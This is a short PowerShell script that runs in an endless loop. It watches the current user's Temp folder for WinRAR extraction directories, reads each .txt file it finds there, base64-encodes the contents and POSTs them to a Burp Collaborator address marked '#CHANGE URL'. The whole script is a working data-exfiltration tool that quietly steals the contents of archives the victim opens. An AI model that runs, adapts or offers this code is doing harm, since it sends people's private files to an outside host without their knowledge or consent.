# Author: Abdullah Alqeisi

$username = $env:Username

# Uncomment if the username in the environmental variable is two words and the one in the /users directory is only the first name of the user
<#$username = ""
foreach ($letter in $temp) {
 	if($letter -ne ' '){$username += $letter}
  	if($letter -eq ' '){break}
}#> 

while(1) {

if(Get-ChildItem -Path C:\Users\$username\AppData\Local\Temp | Where-Object { $_.Name -match 'Rar.........\..' }){

	foreach ($directory in (Get-ChildItem -Path C:\Users\$username\AppData\Local\Temp | Where-Object { $_.Name -match 'Rar.........\..' })){

		foreach ($filename in Get-ChildItem -Path C:\Users\$username\AppData\Local\Temp\$directory\*.txt){

			$filecontent= Get-Content $filename
			$filecontentbytes = [System.Text.Encoding]::UTF8.GetBytes($filecontent)
			$B64EncodedContent = [System.Convert]::ToBase64String($filecontentbytes)

			$target = "https://fo70z55wxi56zxob33p9oiq8hznpbe.burpcollaborator.net"  #CHANGE URL
			$postParams = @{payload=$B64EncodedContent}
			Invoke-WebRequest -Uri $target -Method POST -Body $postParams

}

}

}

}


